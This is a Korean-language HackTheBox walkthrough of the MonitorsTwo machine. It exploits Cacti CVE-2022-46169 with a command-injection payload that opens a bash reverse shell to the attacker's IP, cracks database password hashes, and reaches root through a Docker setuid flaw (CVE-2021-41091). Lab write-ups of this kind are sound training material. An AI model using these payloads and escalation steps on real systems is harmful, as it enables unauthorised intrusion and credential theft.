# MonitorsTwo - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA MonitorsTwo 10.10.11.211
```
<img width="1104" height="437" alt="image" src="https://github.com/user-attachments/assets/11449d32-d1b9-4817-a84d-d3d5292c4fc3" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
<img width="1104" height="481" alt="image" src="https://github.com/user-attachments/assets/3ee968bb-9e82-490c-9ffc-aea7293c6428" />

### CVE-2022-46169
- `Cacti 1.2.22`
<img width="722" height="481" alt="image" src="https://github.com/user-attachments/assets/4d2898a3-daba-4c12-a148-bf4e027334b8" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/cve-2022-46169
<img width="1205" height="868" alt="image" src="https://github.com/user-attachments/assets/614d785f-d1c2-40f5-8f9f-f9f359d28943" />

<br>
<br>

<img width="1100" height="236" alt="image" src="https://github.com/user-attachments/assets/fef31488-16d7-4e2a-8cd5-d224ef3cb032" />

<br>
<br>

- https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit
- `/remote_agent.php` 경로에 헤더를 조작하여 방화벽을 우회한 상태에서 `host_id`와 `local_data_ids[]`파라미터의 값을 찾은 뒤 해당 값을 넣어 페이로드를 전달하는 취약점.
<img width="793" height="545" alt="image" src="https://github.com/user-attachments/assets/d3870028-2221-47e2-a7a1-f70b711e3b86" />

<br>
<br>

- exploit 가능.
```bash
curl -H '{"X-Forwarded-For": "127.0.0.1"}' 'http://10.10.11.211/remote_agent.php'
```
<img width="1103" height="78" alt="image" src="https://github.com/user-attachments/assets/b4a11737-8f6b-45c4-b98f-4090fde0bc52" />

<br>
<br>

- `host_id`와 `local_data_ids[]`의 값을 바꿔가면서 `rrd_name`이 `polling_time`이거나 `uptime`인 변수 찾기.
```bash
for i in {1..5};for j in {1..10};do echo $i $j;curl -H 'X-Forwarded-For: 127.0.0.1' "http://10.10.11.211/remote_agent.php?action=polldata&poller_id=$i&host_id=1&local_data_ids[]=$j";echo "";done;
```
<img width="1103" height="293" alt="image" src="https://github.com/user-attachments/assets/49c9cae6-a1f9-4106-bf99-5e3f507cc975" />

<br>
<br>

- 리버스 셸 코드 실행.
```bash
curl -H 'X-Forwarded-For: 127.0.0.1' 'http://10.10.11.211/remote_agent.php/?action=polldata&poller_id=;bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.16.4%2F80%200%3E%261%22&host_id=1&local_data_ids[]=6'
```
<img width="1103" height="65" alt="image" src="https://github.com/user-attachments/assets/067e3fed-23b3-4d0c-8d96-9ab92f9c7b2a" />

<br>
<br>

- 셸 획득.
<img width="1103" height="178" alt="image" src="https://github.com/user-attachments/assets/cd21bc46-1bef-4c87-a426-2ab5f13c00b2" />

---
## Privesc
- `hostname`을 확인해보니 `Docker`의 컨테이너처럼 보인다.
<img width="1103" height="40" alt="image" src="https://github.com/user-attachments/assets/1e1dd73f-65db-4afc-9e62-c33289d14de6" />

<br>
<br>

- 루트 경로에서 `entrypoint.sh`를 발견.
- `mysql`에 접속할 수 있는 것으로 확인됨.
<img width="1103" height="364" alt="image" src="https://github.com/user-attachments/assets/cc770855-133b-4fad-b21e-5a2912cf99be" />

<br>
<br>

- `mysql` 접속.
```bash
mysql -hdb -uroot -proot
```
<img width="1103" height="192" alt="image" src="https://github.com/user-attachments/assets/00b71cd5-7c60-4def-98b6-b29ec0b0407b" />

<br>
<br>

- `cacti` 데이터베이스의 `user_auth`에서 계정 발견.
```mysql
select * from cacti.user_auth;
```
<img width="1103" height="586" alt="image" src="https://github.com/user-attachments/assets/84533316-4d04-4d6a-b5a3-4bd57d2a2ed6" />

<br>
<br>

- `john`으로 크래킹 진행하여 `marcus`의 비밀번호 발견.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1103" height="170" alt="image" src="https://github.com/user-attachments/assets/a250aa66-9192-4688-96a6-975724a2f38e" />

<br>
<br>

- `marcus:funkymonkey`로 SSH 로그인.
```bash
ssh marcus@10.10.11.211
```
<img width="1103" height="44" alt="image" src="https://github.com/user-attachments/assets/093cf652-d1a5-4cc5-9364-8fda7f4ba44b" />

### CVE-2021-41091
- `Docker`가 실행되고 있기에 버전을 확인.
```bash
docker --version
```
<img width="1103" height="44" alt="image" src="https://github.com/user-attachments/assets/54c32311-38f6-4f3b-9803-0098b5619ca3" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/cve-2021-41091
- 컨테이너 내부에서 setuid가 설정된 프로그램이 있다면 이 프로그램을 실행해서 권한 상승을 시도할 수 있는 취약점.
<img width="1219" height="590" alt="image" src="https://github.com/user-attachments/assets/b16ba7ea-eda5-42d0-9e26-ef12defeb110" />

<br>
<br>

- https://github.com/UncleJ4ck/CVE-2021-41091
- `Docker`로 마운트된 컨테이너 2개 발견.
```bash
findmnt 2>/dev/null|grep "/var/lib/docker/overlay2"|awk '{print $1}'|sed 's/..//'
```
<img width="1104" height="62" alt="image" src="https://github.com/user-attachments/assets/cdb89ad8-198e-4a3d-b87e-65bf3e832052" />

<br>
<br>

- 컨테이너 내부에서 setuid가 설정된 `/sbin/capsh` 발견.
<img width="1104" height="214" alt="image" src="https://github.com/user-attachments/assets/9d3a3d4e-11ac-45d4-ad11-c062e75dd907" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/capsh/
- 권한상승 시도.
```bash
/sbin/capsh --gid=0 --uid=0 --
```
<img width="1104" height="62" alt="image" src="https://github.com/user-attachments/assets/2ec53fb1-351a-48f3-995a-9117062b3fa9" />

<br>
<br>

- `/bin/bash`를 setuid 설정.
```bash
chmod u+s /bin/bash
```
<img width="1104" height="24" alt="image" src="https://github.com/user-attachments/assets/5a7632ee-fbc5-43ea-a7b7-bd0b5e07d36b" />

<br>
<br>

- `/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged`경로에서 bash 실행하여 `root`획득.
```bash
./bin/bash -p -i
```
<img width="1104" height="84" alt="image" src="https://github.com/user-attachments/assets/4ceb59f7-a667-405d-a96c-9d6d569ca2d6" />

---
## FLAG
- `/home/marcus/user.txt`
<img width="1104" height="231" alt="image" src="https://github.com/user-attachments/assets/57ad6051-3345-411c-a0e0-fee6897eb133" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="231" alt="image" src="https://github.com/user-attachments/assets/7a28c630-1b86-4a18-b556-cfd4c6118c69" />























